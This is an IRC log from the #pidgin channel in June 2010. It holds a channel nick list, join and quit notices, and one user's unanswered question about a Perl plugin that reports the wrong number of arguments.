+2010-06-13 07:31:49	--	Nicks #pidgin: [[ND] Ad0 Adola Aexoden Alan_Hicks AllenJB Alver aLXander andy_t_roo1 Anodl antman ArmOrAttAk arni Arsecroft Ashhh asqq averno_ ax-ax Azelphur badcloud Betamonkey bjwebb bla bleeter BlindFreakazoid blubby BrianR Buganini cali candy` Cobalt compengi CPAMX crash\ cybastl cyphase d1b darkrain Darwin4Ever datallah DavidFreeman11 dayton dbbolton decoder defn deryni diddly Dimmuxx Dirtsa dngr Drak0nfly duck__ dukey Edgan elb eporim Erendur Err evil_gordita EvilDennisR Extrems fahadsadah_ faitz felipe_ Fireman17 flamingspinach Fleurety fqueze_ Fudge FunkyFis1 FuzzyPolarBear FyreFoX GabrielGray gillux Gizmokid2005 Guest88562 GuntherDW HerzogDeXtEr1 holla iamtheobject idoru inz jcp JodaZ_ jturney Julian kavakava Kazuha kermit kevdog KingAnt Linux_Time lmao2k logix Lumiere lynxer lysek MagusG Maiku1 Masca Messenger_bird mklappstuhl mns Morgan_Phoenix mrzero Nailz` naquad nb Nickko nickzxcv niekie Nitrox-Linux Nitrox22 nosnilmot oyronakker Ozzapoo penghb PennStater^AtWrk Peter17 Philonous phr0z3n Plasmastar pompy1 ProperNoun proton r0fl rabbit1 rekkanoryo rifter rikai rlaager robbyoconnor RomainK ronghail sadrul samitheberber sash_ shachaf Siggi0904 SimGuy Smoko sno SpeedProg sttwister Suiseiseki tailsn00b TerminX tesiruna Tester tg TheDodger till- TinoDidriksen tomaw tomek treebeard TReKiE trench v3gard Vorondil VQuickSilver wabz Weems wimt wizkid238 Wizzleby Woody``` xsdg Yahweh Z_God |PuLi| |WaV|]
+2010-06-13 07:31:49	--	Channel #pidgin: 172 nicks (0 ops, 0 halfops, 0 voices, 172 normals)
+2010-06-13 07:31:49	--	URL for #pidgin: http://pidgin.im/
+2010-06-13 07:31:51	--	Channel created on Wed, 21 Mar 2007 22:53:10
+2010-06-13 07:33:02	dbbolton	i'm trying to write a perl plugin that takes no arguments, but it says that i didn't give the right number of arguments when i call it: http://paste.debian.net/77242/
+2010-06-13 07:33:45	dbbolton	if i add anything, like "/ql foo", it works.
+2010-06-13 07:34:00	dbbolton	i just can't figure out what is looking for the extra argument.
+2010-06-13 07:34:21	-->	zicho (~zicho@c-9798e355.68-7-64736c14.cust.bredbandsbolaget.se) has joined #pidgin
+2010-06-13 07:53:06	-->	nvision (~nvision@g225062209.adsl.alicedsl.de) has joined #pidgin
+2010-06-13 07:53:30	-->	pir (bcc1c479@gateway/web/freenode/ip.188.193.196.121) has joined #pidgin
+2010-06-13 07:58:04	<--	blubby (~blubby@stud243192.studentenheim.uni-tuebingen.de) has quit (Quit: Leaving.)
+2010-06-13 08:01:18	<--	nvision (~nvision@g225062209.adsl.alicedsl.de) has quit (Ping timeout: 240 seconds)
+2010-06-13 08:01:38	-->	cptnJester (~cptnJeste@pool-72-86-43-250.clppva.fios.verizon.net) has joined #pidgin
+2010-06-13 08:03:53	<--	pir (bcc1c479@gateway/web/freenode/ip.188.193.196.121) has quit (Quit: Page closed)
+2010-06-13 08:04:48	<--	mklappstuhl (~martin@89-107-165-66.dsl-pool.datel-dessau.de) has quit (Ping timeout: 240 seconds)
+2010-06-13 08:05:46	-->	mklappstuhl (~martin@89-107-165-66.dsl-pool.datel-dessau.de) has joined #pidgin
+2010-06-13 08:06:48	<--	ProperNoun (haruspex@wikipedia/ProperNoun) has quit (Ping timeout: 240 seconds)
+2010-06-13 08:06:57		irc: disconnected from server
